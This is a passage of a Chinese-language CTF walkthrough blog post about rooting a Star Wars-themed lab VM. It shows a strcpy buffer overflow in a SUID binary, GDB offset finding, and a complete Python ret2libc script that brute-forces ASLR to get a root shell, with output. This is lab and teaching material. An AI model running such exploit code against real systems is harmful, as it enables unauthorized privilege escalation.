  <span class="pl-smi">char</span> <span class="pl-s1">dest</span>[<span class="pl-c1">64</span>]; <span class="pl-c">// [esp+10h] [ebp-40h] BYREF</span>

  <span class="pl-k">if</span> ( <span class="pl-s1">argc</span> <span class="pl-c1">==</span> <span class="pl-c1">1</span> )
    <span class="pl-en">errx</span>(<span class="pl-c1">1</span>, <span class="pl-s">"Voce tem um futuro aqui. Nao seja um Lammer, busque e aprenda realmente...\n"</span>);
  <span class="pl-k">return</span> (<span class="pl-smi">int</span>)<span class="pl-en">strcpy</span>(<span class="pl-s1">dest</span>, <span class="pl-s1">argv</span>[<span class="pl-c1">1</span>]);
}</pre></div>
<p><code class="notranslate">dest</code> 缓冲区大小为 64 字节。<code class="notranslate">strcpy</code> 将 <code class="notranslate">argv[1]</code> (命令行第一个参数) 复制到 <code class="notranslate">dest</code>，没有长度检查。</p>
<p>在 GDB 中确定 EIP 覆盖的精确偏移量：</p>
<ol>
<li>生成一个唯一的非重复字符串作为输入。</li>
<li>在 GDB 中运行程序，使用该字符串作为参数。</li>
<li>当程序崩溃时，查看 EIP 寄存器的值。</li>
<li>使用 <code class="notranslate">pattern_offset.rb</code> (或类似工具) 找到该值在原始字符串中的偏移。</li>
</ol>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ gdb dartVader
(gdb) <span class="pl-c1">set</span> disassembly-flavor intel
(gdb) run <span class="pl-s"><span class="pl-pds">$(</span>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 80<span class="pl-pds">)</span></span> 
<span class="pl-c"><span class="pl-c">#</span> 或者手动输入 pattern_create 生成的字符串，如 Aa0Aa1...</span>
Starting program: /mnt/hgfs/gx/dartVader Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
[Thread debugging using libthread_db enabled]
Using host libthread_db library <span class="pl-s"><span class="pl-pds">"</span>/lib/x86_64-linux-gnu/libthread_db.so.1<span class="pl-pds">"</span></span>.

Program received signal SIGSEGV, Segmentation fault.
0x63413563 <span class="pl-k">in</span> <span class="pl-en">??</span> ()
(gdb) info registers eip
eip            0x63413563          0x63413563</pre></div>
<p>EIP 被 <code class="notranslate">0x63413563</code> (ASCII "c5Ac") 覆盖。</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x63413563 -l 80
[<span class="pl-k">*</span>] Exact match at offset 76</pre></div>
<p>偏移量为 76 字节。验证：</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ gdb dartVader
(gdb) run <span class="pl-s"><span class="pl-pds">$(</span>python2 -c <span class="pl-s"><span class="pl-pds">'</span>print "A"*76 + "BBBB"<span class="pl-pds">'</span></span><span class="pl-pds">)</span></span>
Starting program: /mnt/hgfs/gx/dartVader <span class="pl-s"><span class="pl-pds">$(</span>python2 -c <span class="pl-s"><span class="pl-pds">'</span>print "A"*76 + "BBBB"<span class="pl-pds">'</span></span><span class="pl-pds">)</span></span>
Program received signal SIGSEGV, Segmentation fault.
0x42424242 <span class="pl-k">in</span> <span class="pl-en">??</span> ()
(gdb) info registers eip
eip            0x42424242          0x42424242</pre></div>
<p>EIP 成功被 <code class="notranslate">BBBB</code> (0x42424242) 覆盖。</p>
<p>检查系统保护机制：</p>
<ul>
<li>
<p>ASLR (地址空间布局随机化):</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">erso@deathStar1:<span class="pl-k">~</span>$ cat /proc/sys/kernel/randomize_va_space
2</pre></div>
<p>ASLR 完全开启。</p>
</li>
<li>
<p>NX (No-eXecute bit):</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">erso@deathStar1:<span class="pl-k">~</span>$ readelf -W -l /bin/dartVader 
<span class="pl-c"><span class="pl-c">#</span> ...</span>
Program Headers:
  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
<span class="pl-c"><span class="pl-c">#</span> ...</span>
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10 
<span class="pl-c"><span class="pl-c">#</span> ...</span></pre></div>
<p><code class="notranslate">GNU_STACK</code> 标志为 <code class="notranslate">RW</code>，表示栈区可读可写但不可执行，NX bit 开启。</p>
</li>
</ul>
<p>由于 ASLR 和 NX 开启，直接注入 shellcode 到栈上执行不可行。采用 Ret2Libc (返回到 libc) 技术。<br>
由于是 32 位系统，libc 地址虽然随机化，但范围相对较小，可以尝试爆破 libc 基址。</p>
<p>获取 libc 中 <code class="notranslate">system</code>、<code class="notranslate">exit</code> 函数和 <code class="notranslate">"/bin/sh"</code> 字符串的偏移量：</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">erso@deathStar1:<span class="pl-k">~</span>$ readelf -s /lib/i386-linux-gnu/libc.so.6 <span class="pl-k">|</span> grep <span class="pl-s"><span class="pl-pds">"</span> system@<span class="pl-pds">"</span></span>
  1443: 00040310    56 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0
<span class="pl-c"><span class="pl-c">#</span> system_offset = 0x00040310</span>

erso@deathStar1:<span class="pl-k">~</span>$ readelf -s /lib/i386-linux-gnu/libc.so.6 <span class="pl-k">|</span> grep <span class="pl-s"><span class="pl-pds">"</span> exit@<span class="pl-pds">"</span></span>
   139: 00033260    45 FUNC    GLOBAL DEFAULT   12 exit@@GLIBC_2.0
<span class="pl-c"><span class="pl-c">#</span> exit_offset = 0x00033260</span>

erso@deathStar1:<span class="pl-k">~</span>$ strings -a -t x /lib/i386-linux-gnu/libc.so.6 <span class="pl-k">|</span> grep <span class="pl-s"><span class="pl-pds">"</span>/bin/sh<span class="pl-pds">"</span></span>
 162d4c /bin/sh
<span class="pl-c"><span class="pl-c">#</span> sh_offset = 0x162d4c</span></pre></div>
<p>多次运行 <code class="notranslate">ldd /bin/dartVader</code> 观察 libc 基址变化范围，例如：</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">erso@deathStar1:<span class="pl-k">~</span>$ ldd /bin/dartVader 
        linux-gate.so.1 =<span class="pl-k">&gt;</span>  (0xb7793000)
        libc.so.6 =<span class="pl-k">&gt;</span> /lib/i386-linux-gnu/libc.so.6 (0xb75d7000) <span class="pl-c"><span class="pl-c">#</span> &lt;--- libc 基址</span>
        /lib/ld-linux.so.2 (0xb7795000)</pre></div>
<p>基址大约在 <code class="notranslate">0xb75xxxxx</code> 到 <code class="notranslate">0xb77xxxxx</code> 之间。</p>
<p>编写爆破脚本 <code class="notranslate">exp.py</code>：</p>
<div class="highlight highlight-source-python"><pre class="notranslate"><span class="pl-c">#!/usr/bin/env python3</span>

<span class="pl-k">from</span> <span class="pl-s1">struct</span> <span class="pl-k">import</span> <span class="pl-s1">pack</span>
<span class="pl-k">from</span> <span class="pl-s1">subprocess</span> <span class="pl-k">import</span> <span class="pl-s1">call</span>

<span class="pl-c"># 已知偏移量</span>
<span class="pl-s1">system_offset</span> <span class="pl-c1">=</span> <span class="pl-c1">0x40310</span>
<span class="pl-s1">exit_offset</span> <span class="pl-c1">=</span> <span class="pl-c1">0x33260</span>
<span class="pl-s1">sh_offset</span> <span class="pl-c1">=</span> <span class="pl-c1">0x162d4c</span>

<span class="pl-c"># 固定目标程序路径</span>
<span class="pl-s1">app</span> <span class="pl-c1">=</span> <span class="pl-s">b"/bin/dartVader"</span>

<span class="pl-c"># 缓冲区填充长度（根据你的溢出点调整）</span>
<span class="pl-s1">offset</span> <span class="pl-c1">=</span> <span class="pl-s">b"A"</span> <span class="pl-c1">*</span> <span class="pl-c1">76</span>

<span class="pl-k">def</span> <span class="pl-en">try_exploit</span>(<span class="pl-s1">libc_base</span>):
    <span class="pl-s1">system</span> <span class="pl-c1">=</span> <span class="pl-en">pack</span>(<span class="pl-s">'&lt;I'</span>, <span class="pl-s1">libc_base</span> <span class="pl-c1">+</span> <span class="pl-s1">system_offset</span>)
    <span class="pl-s1">exit_func</span> <span class="pl-c1">=</span> <span class="pl-en">pack</span>(<span class="pl-s">'&lt;I'</span>, <span class="pl-s1">libc_base</span> <span class="pl-c1">+</span> <span class="pl-s1">exit_offset</span>)
    <span class="pl-s1">sh_str</span> <span class="pl-c1">=</span> <span class="pl-en">pack</span>(<span class="pl-s">'&lt;I'</span>, <span class="pl-s1">libc_base</span> <span class="pl-c1">+</span> <span class="pl-s1">sh_offset</span>)
    <span class="pl-s1">payload</span> <span class="pl-c1">=</span> <span class="pl-s1">offset</span> <span class="pl-c1">+</span> <span class="pl-s1">system</span> <span class="pl-c1">+</span> <span class="pl-s1">exit_func</span> <span class="pl-c1">+</span> <span class="pl-s1">sh_str</span>
    <span class="pl-s1">ret</span> <span class="pl-c1">=</span> <span class="pl-en">call</span>([<span class="pl-s1">app</span>, <span class="pl-s1">payload</span>])
    <span class="pl-k">return</span> <span class="pl-s1">ret</span> <span class="pl-c1">==</span> <span class="pl-c1">0</span>

<span class="pl-c"># 爆破 libc 地址范围（每次增加 0x1000）</span>
<span class="pl-s1">base_address</span> <span class="pl-c1">=</span> <span class="pl-c1">0xb7500000</span>
<span class="pl-s1">end_address</span> <span class="pl-c1">=</span> <span class="pl-c1">0xb7700000</span>

<span class="pl-en">print</span>(<span class="pl-s">"[*] Starting brute-force attack..."</span>)

<span class="pl-s1">found</span> <span class="pl-c1">=</span> <span class="pl-c1">False</span>
<span class="pl-k">for</span> <span class="pl-s1">addr</span> <span class="pl-c1">in</span> <span class="pl-en">range</span>(<span class="pl-s1">base_address</span>, <span class="pl-s1">end_address</span>, <span class="pl-c1">0x1000</span>):
    <span class="pl-en">print</span>(<span class="pl-s">"[+] Trying libc base: 0x%08x"</span> <span class="pl-c1">%</span> <span class="pl-s1">addr</span>)
    <span class="pl-k">if</span> <span class="pl-en">try_exploit</span>(<span class="pl-s1">addr</span>):
        <span class="pl-en">print</span>(<span class="pl-s">"[+] Exploit successful!"</span>)
        <span class="pl-s1">found</span> <span class="pl-c1">=</span> <span class="pl-c1">True</span>
        <span class="pl-k">break</span>

<span class="pl-k">if</span> <span class="pl-c1">not</span> <span class="pl-s1">found</span>:
    <span class="pl-en">print</span>(<span class="pl-s">"[-] Brute-force failed."</span>)</pre></div>
<p>在靶机上运行此脚本（或类似逻辑的脚本）。在爆破过程中，当 libc 基址正确时，<code class="notranslate">system("/bin/sh")</code> 会被调用，从而获得 root shell。<br>
用户在 <code class="notranslate">0xb7564000</code> 这个基址附近（或就是这个基址）获得了成功。</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">erso@deathStar1:<span class="pl-k">~</span>$ python3 exp.py 
<span class="pl-c"><span class="pl-c">#</span> ... (爆破过程) ...</span>
[+] Trying libc base: 0xb7564000 
<span class="pl-c"><span class="pl-c">#</span> (此处脚本可能因 system("/bin/sh") 调用而暂停，或者shell直接接管了终端)</span>
<span class="pl-c"><span class="pl-c">#</span> id</span>
uid=1000(erso) gid=1000(erso) euid=0(root) groups=0(root),1000(erso)
<span class="pl-c"><span class="pl-c">#</span> cat /root/message.txt</span>
Art by Shanaka Dias
                    .==.
                   ()<span class="pl-s"><span class="pl-pds">'</span><span class="pl-pds">'</span></span>()-.
        .---.       <span class="pl-k">;</span>--<span class="pl-k">;</span> /
      .<span class="pl-s"><span class="pl-pds">'</span>_:___". _..<span class="pl-pds">'</span></span>.  __<span class="pl-s"><span class="pl-pds">'</span>.</span>
<span class="pl-s">      |__ --==|<span class="pl-pds">'</span></span>-<span class="pl-s"><span class="pl-pds">'</span><span class="pl-pds">'</span><span class="pl-pds">'</span> \<span class="pl-pds">'</span></span>...<span class="pl-k">;</span>
      [  ]  :[<span class="pl-k">|</span>       <span class="pl-k">|</span>---\
      <span class="pl-k">|</span>__<span class="pl-k">|</span> I<span class="pl-k">=</span>[<span class="pl-k">|</span>     .<span class="pl-s"><span class="pl-pds">'</span>    <span class="pl-pds">'</span></span>.
      / / ____<span class="pl-k">|</span>     <span class="pl-c1">:</span>       <span class="pl-s"><span class="pl-pds">'</span>._</span>
<span class="pl-s">     |-/.____.<span class="pl-pds">'</span></span>      <span class="pl-k">|</span> <span class="pl-c1">:</span>       <span class="pl-c1">:</span>
snd /___<span class="pl-cce">\ </span>/___<span class="pl-cce">\ </span>     <span class="pl-s"><span class="pl-pds">'</span>-<span class="pl-pds">'</span></span>._----<span class="pl-s"><span class="pl-pds">'</span></span>
<span class="pl-s"></span>
<span class="pl-s">-------------------------------------</span>
<span class="pl-s"></span>
<span class="pl-s">Congratulations!!</span>
<span class="pl-s">You helped me destroy the empire<span class="pl-pds">'</span></span>s weapon.

-------------------------------------
If you had fun, love to get your feedback.
Send me a tweet @mrhenrike  <span class="pl-k">;</span>)

Until the next VM and <span class="pl-s"><span class="pl-pds">"</span>May the force be with you<span class="pl-pds">"</span></span>.</pre></div>
<h3>总结</h3>
<p>该靶机涉及了多种渗透技巧：</p>
<ol>
<li>通过流量捕获发现隐藏的 UDP 通信端口。</li>
<li>解析 UDP 消息获取线索和密码。</li>
<li>Base64 解码和图片隐写（steghide）获取进一步指令。</li>
<li>端口敲门技术解锁新的服务端口。</li>
<li>SSH 弱密码爆破（基于提示信息）。</li>
<li>Linux SUID 二进制文件提权，通过缓冲区溢出（strcpy）和 Ret2Libc 技术绕过 ASLR 和 NX 保护，最终获得 root 权限。</li>
</ol>
<p>整个过程对信息收集、线索关联和漏洞利用能力都有一定的考验。</p></div>
<div style="font-size:small;margin-top:8px;float:right;"></div>

<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
<div class="comments" id="comments"></div>

</div>
    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://7r1UMPHK.github.io">TriumphK Blog</a></div>
<div id="footer2">
    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
</div>

<script>
var now=new Date();
document.getElementById("copyrightYear").innerHTML=now.getFullYear();

if(""!=""){
    var startSite=new Date("");
    var diff=now.getTime()-startSite.getTime();
    var diffDay=Math.floor(diff/(1000*60*60*24));
    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
}
</script></div>
</body>
<script>
var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
var utterancesLoad=0;

console.log("\n %c Gmeek main https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
</script>

<script>
document.getElementById("pathHome").setAttribute("d",IconList["home"]);
document.getElementById("pathIssue").setAttribute("d",IconList["github"]);



function openComments(){
    cm=document.getElementById("comments");
    cmButton=document.getElementById("cmButton");
    cmButton.disabled=true;
    cmButton.innerHTML="loading";
    span=document.createElement("span");
    span.setAttribute("class","AnimatedEllipsis");
    cmButton.appendChild(span);

    script=document.createElement("script");
    script.setAttribute("src","https://utteranc.es/client.js");
    script.setAttribute("repo","7r1UMPHK/7r1UMPHK.github.io");
    script.setAttribute("issue-term","title");
    
    script.setAttribute("theme","github-light");
    
    script.setAttribute("crossorigin","anonymous");
    script.setAttribute("async","");
    cm.appendChild(script);

    int=self.setInterval("iFrameLoading()",200);
}

function iFrameLoading(){
    var utterances=document.getElementsByClassName('utterances');
    if(utterances.length==1){
        if(utterances[0].style.height!=""){
            utterancesLoad=1;
            int=window.clearInterval(int);
            document.getElementById("cmButton").style.display="none";
            console.log("utterances Load OK");
        }
    }
}

document.addEventListener('DOMContentLoaded', () => {
    const createClipboardHTML = (codeContent, additionalClasses = '') => `
        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
            </clipboard-copy>
            <div class="copy-feedback">Copied!</div>
        </div>
    `;

    const handleCodeElements = (selector = '') => {
        document.querySelectorAll(selector).forEach(codeElement => {
            const codeContent = codeElement.innerHTML;
            const newStructure = document.createElement('div');
            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
            newStructure.innerHTML = createClipboardHTML(codeContent);

            const parentElement = codeElement.parentElement;
            if (selector.includes('highlight')) {
                parentElement.insertBefore(newStructure, codeElement.nextSibling);
                parentElement.removeChild(codeElement);
            } else {
                parentElement.parentElement.replaceChild(newStructure, parentElement);
            }
        });
    };

    handleCodeElements('pre.notranslate > code.notranslate');
    handleCodeElements('div.highlight > pre.notranslate');

    let currentFeedback = null;
    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
        copyButton.addEventListener('click', () => {
            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
            const tempTextArea = document.createElement('textarea');
            tempTextArea.value = codeContent;
            document.body.appendChild(tempTextArea);
            tempTextArea.select();
            document.execCommand('copy');
            document.body.removeChild(tempTextArea);

            const copyIcon = copyButton.querySelector('.octicon-copy');
            const checkIcon = copyButton.querySelector('.octicon-check');
            const copyFeedback = copyButton.nextElementSibling;

            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
            currentFeedback = copyFeedback;

            copyIcon.classList.add('d-none');
            checkIcon.classList.remove('d-none');
            copyFeedback.style.display = 'block';
            copyButton.style.borderColor = 'var(--color-success-fg)';

            setTimeout(() => {
                copyIcon.classList.remove('d-none');
                checkIcon.classList.add('d-none');
                copyFeedback.style.display = 'none';
                copyButton.style.borderColor = '';
            }, 2000);
        });
    });
});

</script>
</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>

</html>
